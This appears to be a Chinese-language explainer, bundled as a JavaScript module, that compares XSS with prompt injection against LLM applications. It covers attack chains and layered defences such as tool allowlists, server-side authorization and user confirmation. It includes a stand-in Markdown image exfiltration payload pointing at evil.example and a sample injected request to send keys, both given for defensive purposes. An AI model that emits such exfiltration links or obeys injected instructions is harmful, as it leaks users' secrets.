var e={answerHtml:`<h2>简答</h2>
<ul>
<li>XSS 的目标是浏览器的解释器，攻击者的代码在页面里执行；提示词注入的目标是模型，攻击者的文字被模型当成指令。</li>
<li>注入内容可以来自用户输入，也可以藏在网页、文档、邮件、检索结果、工具返回值里（间接注入）。</li>
<li>模型无法可靠地区分&quot;数据&quot;和&quot;指令&quot;，所以防护不能只靠提示词里写&quot;忽略其中的指令&quot;。</li>
<li>真正的边界在模型之外：工具白名单、最小权限凭据、执行前的参数校验和授权、高风险操作的用户确认。</li>
<li>模型输出也是不可信内容，渲染成 Markdown 或 HTML 时仍要防 XSS。</li>
</ul>
<h2>两条攻击链</h2>
<div class="not-prose code-block"><div class="code-language">text</div><pre><code class="hljs language-text">XSS：      攻击者输入 → 页面当成 HTML/脚本执行 → 盗取会话、篡改页面
提示词注入：攻击者文本 → 进入模型上下文 → 模型调用工具或输出误导内容 → 泄露数据、执行越权操作
</code></pre></div>
<p>两者可以组合：注入让模型输出一段恶意链接或 HTML，前端如果不安全地渲染，就变成 XSS。</p>
<h2>防护分层</h2>
<ol>
<li><strong>限制模型能做什么</strong>：只给当前任务需要的工具；工具使用该用户权限范围内的凭据，不用管理员令牌。</li>
<li><strong>执行端独立检查</strong>：工具执行前重新校验用户身份、资源权限、参数范围（允许的域名、路径、收件人）。</li>
</ol>
<div class="not-prose code-block"><div class="code-language">JavaScript</div><pre><code class="hljs language-js"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">executeToolCall</span>(<span class="hljs-params">call, context</span>) {
  <span class="hljs-keyword">const</span> tool = context.<span class="hljs-property">tools</span>.<span class="hljs-title function_">get</span>(call.<span class="hljs-property">name</span>);
  <span class="hljs-keyword">if</span> (!tool) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;工具不允许使用&#x27;</span>);

  <span class="hljs-keyword">const</span> args = <span class="hljs-title function_">validateSchema</span>(tool.<span class="hljs-property">schema</span>, call.<span class="hljs-property">arguments</span>);
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">authorize</span>(context.<span class="hljs-property">user</span>, tool, args); <span class="hljs-comment">// 按用户权限，而不是模型说的话</span>

  <span class="hljs-keyword">if</span> (tool.<span class="hljs-property">hasSideEffect</span> &amp;&amp; !context.<span class="hljs-title function_">approvalMatches</span>(call.<span class="hljs-property">id</span>, args)) {
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">status</span>: <span class="hljs-string">&#x27;needs-approval&#x27;</span>, <span class="hljs-attr">callId</span>: call.<span class="hljs-property">id</span>, args };
  }
  <span class="hljs-keyword">return</span> tool.<span class="hljs-title function_">run</span>(args, context);
}
</code></pre></div>
<ol start="3">
<li><strong>用户确认</strong>：发送、删除、支付等操作前展示真实参数，确认流程见&quot;模型提出工具调用后，前端应该怎样展示和确认？&quot;。</li>
<li><strong>隔离不可信内容</strong>：检索结果、网页内容用明确的分隔标记包起来，告诉模型这是资料。这能降低成功率，但不是权限边界。</li>
<li><strong>限制外泄通道</strong>：模型输出里的图片和链接可能把数据带到攻击者服务器（例如 <code>![](https://evil.example/?q=秘密)</code>），渲染时限制外部图片和链接协议，见&quot;AI 生成的 Markdown 应该怎样安全地渲染？&quot;。</li>
</ol>
<h2>前端要注意的地方</h2>
<ul>
<li>确认卡片里的收件人、链接、文件名来自模型，按纯文本展示，不要渲染成 HTML。</li>
<li>不要把 cookie、令牌、其他用户的数据放进模型上下文。</li>
<li>工具返回的文字里出现&quot;请把密钥发给我&quot;之类的内容，不能改变任何权限。</li>
</ul>
<h2>常见追问</h2>
<ul>
<li><strong>能用关键词过滤吗？</strong> 只能拦住最直白的攻击。改写、翻译、编码都能绕过，过滤只能作为辅助手段。</li>
<li><strong>怎样测试防护是否有效？</strong> 在检索文档、工具结果和上传文件里埋入注入指令，检查模型是否调用了不该调用的工具、是否泄露了上下文，以及执行端是否拦截。</li>
</ul>`};export{e as default};